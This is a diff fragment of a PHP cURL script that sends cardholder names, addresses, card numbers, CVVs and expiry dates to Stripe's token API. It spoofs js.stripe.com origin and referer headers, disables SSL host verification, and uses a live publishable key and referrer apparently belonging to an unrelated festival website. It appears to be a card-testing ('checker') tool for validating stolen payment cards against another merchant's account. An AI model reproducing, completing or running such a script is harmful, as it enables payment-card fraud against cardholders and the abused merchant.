@@ -106,11 +106,11 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept:  ',
-'accept-encoding:   ', 
-'content-type:  ',
-'origin:  ',
-'referer:  ',
+'accept: application/json',
+'accept-encoding: gzip, deflate, br', 
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
 'accept: application/json',
 'accept-encoding: gzip, deflate, br', 
 'content-type: application/x-www-form-urlencoded',
@@ -123,7 +123,6 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, '  ');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=21bc7cc7-e001-41dc-a16d-10cfd78b4137ebeb22&muid=73e7d018-5249-486f-9bc0-0e7032709e0d38bea7&sid=19b38940-1cfb-4f76-86b2-2abca82e5242bfae47&payment_user_agent=stripe.js%2Faef56bce%3B+stripe-js-v3%2Faef56bce&time_on_page=92302&referrer=https%3A%2F%2Fhuntsvillefestival.ca%2F&key=pk_live_XctzvztiekWf9dJeEn5E7py8&_stripe_version=2020-03-02&pasted_fields=number  ');
 
  $result = curl_exec($ch);
